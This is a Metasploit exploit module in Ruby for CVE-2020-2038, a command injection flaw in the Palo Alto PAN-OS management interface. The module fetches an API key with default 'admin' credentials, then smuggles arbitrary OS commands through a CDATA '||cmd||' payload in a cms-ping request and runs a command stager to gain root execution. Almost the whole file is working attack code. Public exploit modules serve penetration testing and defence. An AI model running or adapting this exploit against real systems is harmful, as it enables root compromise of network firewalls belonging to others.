##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Palo Alto Networks Authenticated Remote Code Execution',
        'Description' => %q{
          A command injection vulnerability in the PAN-OS management interface allows authenticated administrators to execute arbitrary OS commands with root privileges.

          This issue impacts:

          PAN-OS 9.0 versions earlier than 9.0.10;

          PAN-OS 9.1 versions earlier than 9.1.4;

          PAN-OS 10.0 versions earlier than 10.0.1.
        },
        'Author' => [
          'Mikhail Klyuchnikov', # Vulnerability discovery
          'Nikita Abramov', # Vulnerability discovery
          'UnD3sc0n0c1d0',                          # Exploit
          'jheysel-r7'                              # msf module
        ],
        'References' => [
          ['CVE', '2020-2038'],
          ['URL', 'https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/'],
          ['URL', 'https://security.paloaltonetworks.com/CVE-2020-2038'],
          ['URL', 'https://github.com/und3sc0n0c1d0/CVE-2020-2038'] # Exploit
        ],
        'DisclosureDate' => '2020-09-09',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_CMD,
        'Privileged' => true,
        'Targets' => [
          [
            'Linux x86',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86,
              'CmdStagerFlavor' => %i[echo printf]
            }
          ],
          [
            'Linux x86_64',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X64,
              'CmdStagerFlavor' => %i[echo printf]
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => { 'WfsDelay' => 2 },
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptString.new('USERNAME', [false, 'PAN-OS username', 'admin']),
        OptString.new('PASSWORD', [false, 'Password for username', 'admin'])
      ]
    )
  end

  def api_key
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/'),
      'vars_get' => {
        'type' => 'keygen',
        'user' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })

    if res.nil?
      fail_with(Failure::Unreachable, 'Connection failed')
    end

    if res.code == 401
      fail_with(Failure::NoAccess, 'Server returned HTTP status 401 - Authentication failed')
    end

    if res.code == 403
      fail_with(Failure::NoAccess, 'Server returned HTTP status 403 - Authentication failed with "Invalid Credentials"')
    end

    if res.body.blank?
      fail_with(Failure::UnexpectedReply, 'Empty reply from server')
    end

    xml = Nokogiri::XML(res.body)
    key = xml.xpath('/response/result/key').text
    print_good('Successfully obtained api key')

    if key.nil?
      fail_with(Failure::UnexpectedReply, 'Empty reply from server')
    end

    key
  end

  def execute_command(cmd, opts = {})
    payload = "<cms-ping><host>8.8.8.8</host><count>1</count><pattern>111<![CDATA[||#{cmd}||]]></pattern></cms-ping>"
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api/'),
      'vars_get' => {
        'cmd' => payload,
        'type' => 'op',
        'key' => opts[:key]
      }
    })
  end

  def exploit
    print_status('Authenticating...')
    key = api_key
    print_status('Exploiting...')
    execute_cmdstager(key: key)
  end

end
